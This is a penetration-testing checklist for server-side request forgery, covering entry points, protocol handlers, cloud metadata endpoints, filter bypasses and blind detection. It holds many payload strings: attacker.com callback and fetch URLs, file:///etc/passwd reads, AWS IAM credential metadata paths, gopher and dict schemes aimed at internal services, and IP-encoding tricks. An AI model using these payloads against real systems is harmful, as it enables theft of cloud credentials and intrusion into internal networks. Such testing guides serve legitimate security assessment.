# 🔍 SERVER-SIDE REQUEST FORGERY (SSRF) TESTING CHECKLIST

 ## Comprehensive Server-Side Request Forgery Testing

### 1 Basic SSRF Vector Testing
    - URL Parameter Testing:
      * Direct URL parameters: url=http://attacker.com
      * Image URLs: image_url=http://attacker.com/shell.jpg
      * File import URLs: import_url=http://attacker.com/data.xml
      * Webhook URLs: callback=http://attacker.com/callback
      * API endpoint parameters: endpoint=http://attacker.com/api

    - Common SSRF Entry Points:
      * File upload functionality (URL upload)
      * Document processing (PDF, Office documents)
      * Image processing and thumbnailing
      * RSS feed readers
      * Social media integration (share buttons)

    - Protocol Handler Testing:
      * HTTP/HTTPS: http://, https://
      * File protocol: file:///etc/passwd
      * FTP: ftp://attacker.com/file
      * GOPHER: gopher://attacker.com:70/
      * DICT: dict://attacker.com:1337/

### 2 Internal Network Reconnaissance
    - Localhost Access Testing:
      * Standard localhost: http://localhost, http://127.0.0.1
      * IPv4 localhost: http://0.0.0.0, http://127.1, http://127.0.0.1.nip.io
      * IPv6 localhost: http://[::1], http://[::ffff:127.0.0.1]
      * Shortened IP: http://0177.0.0.1, http://2130706433

    - Private IP Range Testing:
      * Class A: 10.0.0.0/8 (10.0.0.1-10.255.255.254)
      * Class B: 172.16.0.0/12 (172.16.0.1-172.31.255.254)
      * Class C: 192.168.0.0/16 (192.168.0.1-192.168.255.254)
      * Link-local: 169.254.0.0/16

    - Common Internal Services:
      * Database ports: 3306, 5432, 27017, 1433
      * Cache services: 6379, 11211
      * Message queues: 5672, 61613
      * Administrative interfaces: 8080, 8443, 3000

### 3 Cloud Metadata Service Testing
    - AWS Metadata Service:
      * Instance metadata: http://169.254.169.254/latest/meta-data/
      * IAM credentials: http://169.254.169.254/latest/meta-data/iam/security-credentials/
      * User data: http://169.254.169.254/latest/user-data
      * Latest meta-data path traversal

    - Google Cloud Metadata:
      * Metadata endpoint: http://metadata.google.internal/computeMetadata/v1/
      * With header: Metadata-Flavor: Google
      * Service accounts: /instance/service-accounts/
      * Project metadata

    - Azure Metadata Service:
      * Instance metadata: http://169.254.169.254/metadata/instance
      * With header: Metadata: true
      * API version: api-version=2021-02-01
      * Attached resources and network info

    - Other Cloud Providers:
      * DigitalOcean: 169.254.169.254/metadata/v1.json
      * Oracle Cloud: 169.254.169.254/opc/v1/instance/
      * Alibaba Cloud: 100.100.100.200/latest/meta-data/
      * Kubernetes: 10.0.0.1 (API server)

### 4 Protocol Handler Exploitation
    - File Protocol Exploitation:
      * Local file reading: file:///etc/passwd
      * Directory traversal: file://../../etc/passwd
      * Windows file access: file:///C:/Windows/System32/drivers/etc/hosts
      * UNC paths (Windows): file://///attacker.com/share

    - FTP Protocol Testing:
      * Basic FTP: ftp://attacker.com/file.txt
      * Authenticated FTP: ftp://user:pass@attacker.com/file
      * Passive mode exploitation
      * FTP bounce attacks

    - Gopher Protocol Testing:
      * Raw TCP connections: gopher://attacker.com:70/_test
      * HTTP request generation via Gopher
      * SMTP/Redis/Memcached over Gopher
      * POST request simulation

    - Dict Protocol Testing:
      * Dictionary protocol information disclosure
      * Port scanning via DICT
      * Service enumeration

### 5 Advanced SSRF Techniques
    - URL Parser Bypass Techniques:
      * URL encoding: http://127.0.0.1%00@attacker.com
      * Double URL encoding
      * Unicode normalization
      * Case variation in schema

    - DNS Rebinding Attacks:
      * Time-to-live (TTL) manipulation
      * Multiple A record DNS setups
      * DNS rebinding services (rbndr.us, dnsrebinder.net)
      * Custom DNS server configuration

    - Redirect Bypass Techniques:
      * Open redirect chains
      * URL shortener services
      * HTTP to HTTPS redirects
      * Meta refresh redirects

### 6 Application-Specific SSRF Testing
    - Webhook Functionality:
      * Payment callback URLs
      * OAuth redirect_uri parameters
      * Webhook verification bypass
      * Timing attacks on webhooks

    - File Processing Services:
      * Document conversion services
      * Image processing (resize, crop, filter)
      * Video transcoding services
      * PDF generation services

    - Import/Export Features:
      * CSV/Excel import from URL
      * XML import with external entities
      * RSS/Atom feed importers
      * Data synchronization from URLs

### 7 Blind SSRF Testing
    - Out-of-Band Detection:
      * DNS callback: http://unique-id.attacker.com
      * HTTP callback: http://attacker.com/callback?unique=id
      * Time-based detection
      * Error-based detection

    - Time-Based Detection:
      * Response time analysis for internal services
      * Port-specific timing differences
      * Service-specific response patterns
      * Load balancer timing attacks

    - Error-Based Information Disclosure:
      * Connection refused errors
      * Timeout errors
      * SSL certificate errors
      * HTTP status code differences

### 8 Filter Bypass Techniques
    - Blacklist Bypass Methods:
      * Localhost bypass: 127.0.0.1.nip.io, localtest.me
      * Decimal IP: 2130706433 (127.0.0.1)
      * Hexadecimal IP: 0x7f000001
      * Octal IP: 017700000001
      * IPv6 compact: [::]

    - Domain Filter Bypass:
      * Subdomain tricks: 127.0.0.1.attacker.com
      * URL embedding: http://attacker.com@127.0.0.1
      * Data URLs: data:text/html,<script>alert(1)</script>
      * Fragment bypass: http://attacker.com#@127.0.0.1

    - Scheme Filter Bypass:
      * Case variation: HtTp://, HTTP://, http://
      * Scheme stacking: http://https://attacker.com
      * Missing scheme with //attacker.com
      * Custom schemes with protocol handlers

### 9 Impact Amplification Testing
    - Port Scanning:
      * Horizontal scanning of internal networks
      * Vertical scanning of specific hosts
      * Banner grabbing from services
      * Service enumeration

    - Service Interaction:
      * HTTP service manipulation
      * Redis command injection via SSRF
      * Memcached data manipulation
      * REST API interaction with internal services

    - Authentication Bypass:
      * HTTP basic auth: http://user:pass@internal-service
      * API key forwarding
      * Session cookie replay to internal services
      * OAuth token misuse

### 10 Cloud-Specific SSRF Testing
    - Container Environment Testing:
      * Docker bridge network: 172.17.0.1
      * Kubernetes services and pods
      * Service mesh internal communication
      * Container metadata services

    - Serverless Environment Testing:
      * AWS Lambda environment variables
      * Azure Functions internal endpoints
      * Google Cloud Functions metadata
      * Function-to-function communication

    - PaaS Environment Testing:
      * Heroku private spaces
      * Cloud Foundry internal routing
      * OpenShift service discovery
      * Platform-specific internal APIs

### 11 Defense Bypass Testing
    - WAF Evasion Techniques:
      * IP address obfuscation
      * URL parser confusion
      * Request splitting
      * Chunked encoding attacks

    - Network Security Bypass:
      * DNS rebinding to bypass IP restrictions
      * HTTP tunneling through allowed domains
      * Protocol confusion attacks
      * Port redirection techniques

    - Application Logic Bypass:
      * Business workflow exploitation
      * Feature abuse for SSRF
      * Race conditions in URL validation
      * Cache poisoning to bypass filters

#### Testing Tools and Methodologies:
    Manual Testing Tools:
    - Burp Suite with Collaborator
    - OWASP ZAP with SSRF plugins
    - SSRFProxy for automated testing
    - Custom Python scripts with requests

    Automated Testing Tools:
    - SSRF testing frameworks (Ground-Control, SSRFire)
    - Nuclei templates for SSRF
    - Custom fuzzing wordlists
    - Cloud metadata service scanners

    Specialized Testing Tools:
    - DNS rebinding testing tools
    - Protocol handler exploit frameworks
    - Internal network mappers via SSRF
    - Cloud environment reconnaissance tools

    Test Case Examples:
    - Basic: http://169.254.169.254/latest/meta-data/
    - Filter bypass: http://0177.0.0.1:80/
    - DNS rebinding: http://rbndr.us:53/7f000001
    - Protocol: file:///etc/passwd
    - Redirect: http://attacker.com/redirect?target=http://internal

    Testing Methodology:
    1. Identify all URL fetching functionality
    2. Test basic external URL access
    3. Attempt internal service access
    4. Test cloud metadata endpoints
    5. Verify protocol handler vulnerabilities
    6. Test filter bypass techniques
    7. Attempt blind SSRF detection
    8. Assess impact and data exposure
    9. Test defense mechanisms
    10. Document exploitation paths

    Protection Mechanisms Testing:
    - URL validation effectiveness
    - DNS resolution security
    - Network egress filtering
    - Application-level controls
    - Cloud security configurations
    - WAF/IPS SSRF protection rules